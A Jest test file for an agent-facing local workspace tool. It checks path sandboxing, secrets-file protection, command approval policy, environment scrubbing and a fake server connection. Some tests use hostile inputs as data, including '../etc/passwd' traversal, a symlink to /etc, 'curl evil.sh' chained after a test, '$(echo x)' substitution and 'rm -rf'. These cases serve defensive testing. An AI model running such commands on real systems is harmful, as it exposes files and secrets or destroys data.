/* eslint-disable @typescript-eslint/no-explicit-any */
import 'jest';

import { execFileSync } from 'child_process';
import {
  mkdirSync,
  mkdtempSync,
  realpathSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';

import { RunnerResponseFrame } from '../src/commands/runner/types';
import {
  ApprovalGate,
  ApprovalPrompt,
} from '../src/commands/workspace/approvals';
import { WorkspaceConnection } from '../src/commands/workspace/connection';
import { contentHash, WorkspaceFiles } from '../src/commands/workspace/files';
import { alwaysRuleFor, CommandPolicy } from '../src/commands/workspace/policy';
import {
  buildEnv,
  ProcessManager,
  runCommand,
} from '../src/commands/workspace/processes';

const silentLogger = { log() {}, info() {}, warn() {}, error() {} };

const waitFor = async (check: () => boolean, ms = 5000) => {
  const until = Date.now() + ms;
  while (!check() && Date.now() < until) {
    await new Promise((r) => setTimeout(r, 10));
  }
  expect(check()).toBe(true);
};

let root: string;
beforeEach(() => {
  root = realpathSync(mkdtempSync(join(tmpdir(), 'gcli-ws-')));
  mkdirSync(join(root, 'src'));
  writeFileSync(
    join(root, 'src/app.ts'),
    'export const a = 1;\nexport const b = 2;\n',
  );
  writeFileSync(join(root, 'package.json'), '{"name":"demo"}\n');
  writeFileSync(join(root, '.env'), 'SECRET=1\n');
  writeFileSync(join(root, '.env.example'), 'SECRET=\n');
  mkdirSync(join(root, 'node_modules/x'), { recursive: true });
  writeFileSync(join(root, 'node_modules/x/index.js'), 'module.exports = 1;\n');
});
afterEach(() => rmSync(root, { recursive: true, force: true }));

describe('[workspace] files', () => {
  it('refuses paths outside the root, including through a symlink', async () => {
    const files = new WorkspaceFiles(root);
    await expect(files.read({ path: '../etc/passwd' })).rejects.toThrow(
      /outside/,
    );
    await expect(files.read({ path: '/etc/passwd' })).rejects.toThrow(
      /outside/,
    );
    symlinkSync('/etc', join(root, 'etc-link'));
    await expect(files.read({ path: 'etc-link/passwd' })).rejects.toThrow(
      /symlink/,
    );
    await expect(
      files.write({ path: 'etc-link/evil', content: 'x' }),
    ).rejects.toThrow(/symlink/);
  });

  it('keeps secrets files out unless --allow-secrets (templates stay readable)', async () => {
    const files = new WorkspaceFiles(root);
    await expect(files.read({ path: '.env' })).rejects.toThrow(/secrets/);
    await expect(files.read({ path: '.env.example' })).resolves.toMatchObject({
      content: 'SECRET=\n',
    });
    const open = new WorkspaceFiles(root, { allowSecrets: true });
    await expect(open.read({ path: '.env' })).resolves.toMatchObject({
      content: 'SECRET=1\n',
    });
  });

  it('never writes into .git', async () => {
    const files = new WorkspaceFiles(root);
    await expect(
      files.write({ path: '.git/hooks/pre-commit', content: 'x' }),
    ).rejects.toThrow(/\.git/);
  });

  it('lists files (skipping node_modules) and one level at a time', async () => {
    const files = new WorkspaceFiles(root);
    const all = await files.list({});
    const paths = all.files.map((f) => f.path);
    expect(paths).toEqual(
      expect.arrayContaining(['src/app.ts', 'package.json']),
    );
    expect(paths.some((p) => p.startsWith('node_modules'))).toBe(false);
    const top = await files.list({ recursive: false });
    expect(top.files).toEqual(
      expect.arrayContaining([
        { path: 'src', type: 'dir' },
        expect.objectContaining({ path: 'package.json', type: 'file' }),
      ]),
    );
  });

  it('respects .gitignore in a git repository', async () => {
    execFileSync('git', ['init', '-q'], { cwd: root });
    writeFileSync(join(root, '.gitignore'), 'dist\n');
    mkdirSync(join(root, 'dist'));
    writeFileSync(join(root, 'dist/out.js'), 'x');
    const paths = (await new WorkspaceFiles(root).list({})).files.map(
      (f) => f.path,
    );
    expect(paths).toContain('src/app.ts');
    expect(paths).not.toContain('dist/out.js');
  });

  it('reads line ranges and edits with an exact, unique match and a hash check', async () => {
    const files = new WorkspaceFiles(root);
    const read = await files.read({
      path: 'src/app.ts',
      startLine: 2,
      endLine: 2,
    });
    expect(read).toMatchObject({
      content: 'export const b = 2;',
      totalLines: 3,
    });

    await expect(
      files.edit({ path: 'src/app.ts', oldText: 'export const', newText: 'x' }),
    ).rejects.toThrow(/occurs 2 times/);
    await expect(
      files.edit({ path: 'src/app.ts', oldText: 'nope', newText: 'x' }),
    ).rejects.toThrow(/not found/);
    await expect(
      files.edit({
        path: 'src/app.ts',
        oldText: 'a = 1',
        newText: 'a = 10',
        expectedHash: 'stale',
      }),
    ).rejects.toThrow(/changed since you read it/);

    const edited = await files.edit({
      path: 'src/app.ts',
      oldText: 'a = 1',
      newText: 'a = 10',
      expectedHash: read.hash,
    });
    expect(edited.replacements).toBe(1);
    const after = await files.read({ path: 'src/app.ts' });
    expect(after.content).toContain('a = 10');
    expect(after.hash).toBe(contentHash(after.content));
  });

  it('writes new files with their folders and deletes files only', async () => {
    const files = new WorkspaceFiles(root);
    await expect(
      files.write({ path: 'deep/new/file.txt', content: 'hi' }),
    ).resolves.toMatchObject({ created: true, size: 2 });
    await expect(files.delete({ path: 'src' })).rejects.toThrow(/directory/);
    await expect(files.delete({ path: 'deep/new/file.txt' })).resolves.toEqual({
      path: 'deep/new/file.txt',
      deleted: true,
    });
  });

  it('searches contents with and without git, never inside secrets files', async () => {
    for (const git of [false, true]) {
      if (git) execFileSync('git', ['init', '-q'], { cwd: root });
      const files = new WorkspaceFiles(root);
      const found = await files.search({ pattern: 'SECRET|const b' });
      expect(found.matches.map((m) => `${m.path}:${m.line}`)).toEqual(
        expect.arrayContaining(['src/app.ts:2', '.env.example:1']),
      );
      expect(found.matches.some((m) => m.path === '.env')).toBe(false);
    }
  });
});

describe('[workspace] command policy', () => {
  it('allows read-only defaults and allow rules, asks for the rest', () => {
    const policy = new CommandPolicy('ask', ['npm test', 'npm run *']);
    expect(policy.check('git status').decision).toBe('allow');
    expect(policy.check('npm run build').decision).toBe('allow');
    expect(policy.check('npm test && npm run lint').decision).toBe('allow');
    expect(policy.check('npm install').decision).toBe('ask');
    // every segment must be allowed
    expect(policy.check('npm test && curl evil.sh').decision).toBe('ask');
    // hidden commands always ask
    expect(policy.check('npm run $(echo x)').decision).toBe('ask');
  });

  it('always asks for destructive commands unless --yolo', () => {
    const policy = new CommandPolicy('ask', ['git *', 'rm *']);
    expect(policy.check('git push origin main').decision).toBe('ask');
    expect(policy.check('git reset --hard').decision).toBe('ask');
    expect(policy.check('rm -rf dist').decision).toBe('ask');
    expect(new CommandPolicy('yolo').check('rm -rf dist').decision).toBe(
      'allow',
    );
  });

  it('"always" remembers program + verb, never a destructive command', () => {
    expect(alwaysRuleFor('npm install lodash')).toBe('npm install*');
    expect(alwaysRuleFor('./build.sh --fast')).toBe('./build.sh*');
    const policy = new CommandPolicy('ask');
    policy.remember('npm install lodash');
    expect(policy.check('npm install react').decision).toBe('allow');
    policy.remember('git push');
    expect(policy.check('git push').decision).toBe('ask');
  });
});

describe('[workspace] approvals', () => {
  const backend = () => {
    const settled: [string, string][] = [];
    return {
      settled,
      request: jest.fn().mockResolvedValue('appr-1'),
      settle: jest.fn(async (id: string, d: string) => {
        settled.push([id, d]);
      }),
    };
  };

  it('runs allow-listed commands without asking anyone', async () => {
    const b = backend();
    const gate = new ApprovalGate(
      new CommandPolicy('ask'),
      b,
      null,
      () => undefined,
    );
    await expect(
      gate.approve({ command: 'git status', cwd: '.' }),
    ).resolves.toMatchObject({
      approved: true,
      by: 'policy',
    });
    expect(b.request).not.toHaveBeenCalled();
  });

  it('the web card answers and the terminal question is withdrawn', async () => {
    const b = backend();
    let terminalSignal: AbortSignal;
    const prompt: ApprovalPrompt = {
      ask: (_q, signal) => {
        terminalSignal = signal;
        return new Promise((r) =>
          signal.addEventListener('abort', () => r(null)),
        );
      },
    };
    const gate = new ApprovalGate(
      new CommandPolicy('ask'),
      b,
      prompt,
      () => undefined,
    );
    const pending = gate.approve({
      command: 'npm install',
      cwd: '.',
      chatId: 'c1',
    });
    await waitFor(() => terminalSignal !== undefined);
    expect(b.request).toHaveBeenCalledWith({
      command: 'npm install',
      cwd: '.',
      chatId: 'c1',
    });
    gate.onWebDecision('appr-1', 'always');
    await expect(pending).resolves.toMatchObject({ approved: true, by: 'web' });
    expect(terminalSignal.aborted).toBe(true);
    // the web already knows; nothing to settle
    expect(b.settle).not.toHaveBeenCalled();
    // "always" is remembered for the session
    expect(
      (await gate.approve({ command: 'npm install x', cwd: '.' })).by,
    ).toBe('policy');
  });

  it('a web answer that beats the card id back is not lost', async () => {
    const b = backend();
    b.request.mockImplementation(async () => {
      gate.onWebDecision('appr-1', 'allow');
      return 'appr-1';
    });
    const gate = new ApprovalGate(
      new CommandPolicy('ask'),
      b,
      null,
      () => undefined,
    );
    await expect(
      gate.approve({ command: 'npm ci', cwd: '.' }),
    ).resolves.toMatchObject({
      approved: true,
      by: 'web',
    });
  });

  it('a terminal "no" denies and closes the web card', async () => {
    const b = backend();
    const prompt: ApprovalPrompt = { ask: async () => 'deny' };
    const gate = new ApprovalGate(
      new CommandPolicy('ask'),
      b,
      prompt,
      () => undefined,
    );
    await expect(
      gate.approve({ command: 'npm install', cwd: '.' }),
    ).resolves.toMatchObject({
      approved: false,
      decision: 'deny',
      by: 'terminal',
    });
    expect(b.settled).toEqual([['appr-1', 'deny']]);
  });

  it('expires when nobody answers', async () => {
    const b = backend();
    const gate = new ApprovalGate(
      new CommandPolicy('ask'),
      b,
      null,
      () => undefined,
      30,
    );
    await expect(
      gate.approve({ command: 'npm install', cwd: '.' }),
    ).resolves.toMatchObject({
      approved: false,
      by: 'timeout',
    });
    expect(b.settled).toEqual([['appr-1', 'expired']]);
  });
});

describe('[workspace] commands and processes', () => {
  const env = buildEnv({});

  it('passes a minimal environment unless told otherwise', () => {
    const source = {
      PATH: '/bin',
      HOME: '/h',
      AWS_SECRET_ACCESS_KEY: 'x',
      MY_VAR: 'y',
    };
    expect(buildEnv({}, {}, source)).toMatchObject({
      PATH: '/bin',
      HOME: '/h',
    });
    expect(buildEnv({}, {}, source).AWS_SECRET_ACCESS_KEY).toBeUndefined();
    expect(buildEnv({ passEnv: ['MY_VAR'] }, {}, source).MY_VAR).toBe('y');
    expect(
      buildEnv({ inheritEnv: true }, {}, source).AWS_SECRET_ACCESS_KEY,
    ).toBe('x');
  });

  it('runs a command and reports exit code and output', async () => {
    const result = await runCommand({
      command: 'echo out; echo err 1>&2; exit 3',
      cwd: root,
      displayCwd: '.',
      env,
    });
    expect(result).toMatchObject({ exitCode: 3, timedOut: false });
    expect(result.stdout.trim()).toBe('out');
    expect(result.stderr.trim()).toBe('err');
  });

  it('kills a command (and its children) on timeout', async () => {
    const result = await runCommand({
      command: 'sleep 30 & sleep 30',
      cwd: root,
      displayCwd: '.',
      timeoutSeconds: 1,
      env,
    });
    expect(result.timedOut).toBe(true);
  });

  it('starts a background process, waits for its ready line, tails and stops it', async () => {
    const manager = new ProcessManager();
    const started = await manager.start({
      command: 'echo booting; sleep 0.2; echo "listening on 3000"; sleep 30',
      cwd: root,
      displayCwd: '.',
      name: 'api',
      waitFor: 'listening',
      waitSeconds: 5,
      env,
    });
    expect(started).toMatchObject({
      status: 'running',
      matched: true,
      name: 'api',
    });
    expect(started.output).toContain('listening on 3000');

    const logs = manager.logs({ processId: started.processId, tail: 1 });
    expect(logs.lines).toEqual(['listening on 3000']);
    expect(
      manager.logs({ processId: started.processId, sinceLine: logs.nextLine })
        .lines,
    ).toEqual([]);

    await expect(
      manager.stop({ processId: started.processId }),
    ).resolves.toMatchObject({
      status: 'stopped',
    });
    expect(() => manager.logs({ processId: 'p99' })).toThrow(/no process/);
  });
});

describe('[workspace] connection', () => {
  /** Plays the Lambforge subscriptions server for a workspace. */
  class FakeServer {
    readyState = 1;
    onopen = null;
    onmessage = null;
    onclose = null;
    onerror = null;
    sent: any[] = [];
    heartbeats: any[] = [];
    approvals: any[] = [];
    frames: RunnerResponseFrame[] = [];

    send(data: string) {
      const msg = JSON.parse(data);
      this.sent.push(msg);
      if (msg.type === 'connection_init') {
        this.reply({ type: 'connection_ack' });
      } else if (msg.type === 'start' && msg.id !== 'runner-requests') {
        const { query, variables } = msg.payload;
        let data: any = {};
        if (query.includes('localWorkspaceHeartbeat')) {
          this.heartbeats.push(variables);
          data = { localWorkspaceHeartbeat: { id: 'w1', name: 'demo' } };
        } else if (query.includes('requestLocalWorkspaceApproval')) {
          this.approvals.push(variables);
          data = { requestLocalWorkspaceApproval: { id: 'appr-9' } };
        } else if (query.includes('runnerRespond')) {
          this.frames.push(...variables.frames);
          data = { runnerRespond: { status: 'ok' } };
        }
        this.reply({ id: msg.id, type: 'data', payload: { data } });
        this.reply({ id: msg.id, type: 'complete' });
      }
    }
    request(payload: Record<string, unknown>) {
      this.reply({
        id: 'runner-requests',
        type: 'data',
        payload: { data: { subscribeToRunnerRequests: payload } },
      });
    }
    close() {
      this.readyState = 3;
      setImmediate(() => this.onclose?.({}));
    }
    private reply(msg: unknown) {
      setImmediate(() => this.onmessage?.({ data: JSON.stringify(msg) }));
    }
  }

  const bodyOf = (frames: RunnerResponseFrame[], requestId: string) => {
    const own = frames
      .filter((f) => f.requestId === requestId)
      .sort((a, b) => a.seq - b.seq);
    return {
      status: own.find((f) => f.type === 'head')?.status,
      json: JSON.parse(
        own
          .filter((f) => f.type === 'chunk')
          .map((f) => f.data)
          .join('') || 'null',
      ),
      done: own.some((f) => f.type === 'end' || f.type === 'error'),
      types: own.map((f) => f.type),
    };
  };

  const connect = (server: FakeServer) => {
    const connection = new WorkspaceConnection({
      wsUrl: 'ws://test/subscriptions',
      token: 'lfw_secret',
      root,
      version: 'test',
      logger: silentLogger,
      policy: new CommandPolicy('ask'),
      prompt: null,
      createSocket: () => {
        setImmediate(() => server.onopen?.({}));
        return server as any;
      },
      flushMs: 1,
    });
    return { connection, running: connection.run() };
  };

  it('authenticates with the workspace token and reports root, policy and processes', async () => {
    const server = new FakeServer();
    const { connection, running } = connect(server);
    await waitFor(() => server.heartbeats.length >= 1);
    expect(server.sent[0]).toEqual({
      type: 'connection_init',
      payload: { workspaceToken: 'lfw_secret' },
    });
    expect(server.heartbeats[0].info).toMatchObject({
      root,
      policy: { mode: 'ask', allow: expect.arrayContaining(['git status*']) },
      processes: [],
    });
    connection.stop();
    await running;
  });

  it('serves a file edit and refuses paths outside the workspace operations', async () => {
    const server = new FakeServer();
    const { connection, running } = connect(server);
    await waitFor(() => server.heartbeats.length >= 1);

    server.request({
      requestId: 'e1',
      type: 'request',
      method: 'POST',
      path: '/workspace/edit',
      body: JSON.stringify({
        path: 'src/app.ts',
        oldText: 'a = 1',
        newText: 'a = 5',
      }),
    });
    server.request({
      requestId: 'bad',
      type: 'request',
      method: 'POST',
      path: '/v1/chat/completions',
      body: '{}',
    });
    await waitFor(
      () =>
        bodyOf(server.frames, 'e1').done && bodyOf(server.frames, 'bad').done,
    );

    expect(bodyOf(server.frames, 'e1')).toMatchObject({
      status: 200,
      json: { path: 'src/app.ts', replacements: 1 },
    });
    expect(bodyOf(server.frames, 'bad').types).toEqual(['error']);

    server.request({
      requestId: 'e2',
      type: 'request',
      method: 'POST',
      path: '/workspace/read',
      body: JSON.stringify({ path: '../outside' }),
    });
    await waitFor(() => bodyOf(server.frames, 'e2').done);
    expect(bodyOf(server.frames, 'e2')).toMatchObject({
      status: 403,
      json: { error: expect.stringMatching(/outside/) },
    });

    connection.stop();
    await running;
  });

  it('runs a command once the user approves it on the web', async () => {
    const server = new FakeServer();
    const { connection, running } = connect(server);
    await waitFor(() => server.heartbeats.length >= 1);

    server.request({
      requestId: 'x1',
      type: 'request',
      method: 'POST',
      path: '/workspace/exec',
      body: JSON.stringify({ command: 'echo approved-run', chatId: 'chat-7' }),
    });
    await waitFor(() => server.approvals.length === 1);
    expect(server.approvals[0]).toMatchObject({
      command: 'echo approved-run',
      cwd: '.',
      chatId: 'chat-7',
    });
    server.request({
      requestId: 'appr-9',
      type: 'approval',
      body: JSON.stringify({ decision: 'allow' }),
    });
    await waitFor(() => bodyOf(server.frames, 'x1').done);
    expect(bodyOf(server.frames, 'x1')).toMatchObject({
      status: 200,
      json: { exitCode: 0, stdout: 'approved-run\n' },
    });

    connection.stop();
    await running;
  });

  it('answers a denied command with an error the agent must not retry', async () => {
    const server = new FakeServer();
    const { connection, running } = connect(server);
    await waitFor(() => server.heartbeats.length >= 1);
    server.request({
      requestId: 'x2',
      type: 'request',
      method: 'POST',
      path: '/workspace/exec',
      body: JSON.stringify({ command: 'touch should-not-exist' }),
    });
    await waitFor(() => server.approvals.length === 1);
    server.request({
      requestId: 'appr-9',
      type: 'approval',
      body: JSON.stringify({ decision: 'deny' }),
    });
    await waitFor(() => bodyOf(server.frames, 'x2').done);
    expect(bodyOf(server.frames, 'x2')).toMatchObject({
      status: 403,
      json: { error: expect.stringMatching(/denied.*Do not retry/) },
    });
    connection.stop();
    await running;
  });
});
